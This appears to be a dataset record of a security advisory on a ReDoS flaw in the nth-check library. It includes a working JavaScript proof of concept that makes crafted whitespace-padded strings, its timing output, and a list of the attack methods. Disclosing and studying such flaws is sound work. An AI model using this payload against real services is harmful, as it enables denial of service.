{"description": "There is a Regular Expression Denial of Service (ReDoS) vulnerability in nth-check that causes a denial of service when parsing crafted invalid CSS nth-checks.\n\nThe ReDoS vulnerabilities of the regex are mainly due to the sub-pattern `\\s*(?:([+-]?)\\s*(\\d+))?` with quantified overlapping adjacency and can be exploited with the following code.\n\n**Proof of Concept**\n```js\n// PoC.js\nvar nthCheck = require(\"nth-check\")\nfor(var i = 1; i <= 50000; i++) {\n    var time = Date.now();\n    var attack_str = '2n' + ' '.repeat(i*10000)+\"!\";\n    try {\n        nthCheck.parse(attack_str) \n    }\n    catch(err) {\n        var time_cost = Date.now() - time;\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\n    }\n}\n```\n\n**The Output**\n```\nattack_str.length: 10003: 174 ms\nattack_str.length: 20003: 1427 ms\nattack_str.length: 30003: 2602 ms\nattack_str.length: 40003: 4378 ms\nattack_str.length: 50003: 7473 ms\n```", "methods": ["Used a Regular Expression Denial of Service (ReDoS) vulnerability to cause a denial of service when parsing crafted invalid CSS nth-checks.", "Exploited a sub-pattern with quantified overlapping adjacency in the regex to cause a denial of service.", "Used a crafted string to trigger the ReDoS vulnerability, causing a significant increase in processing time."]}
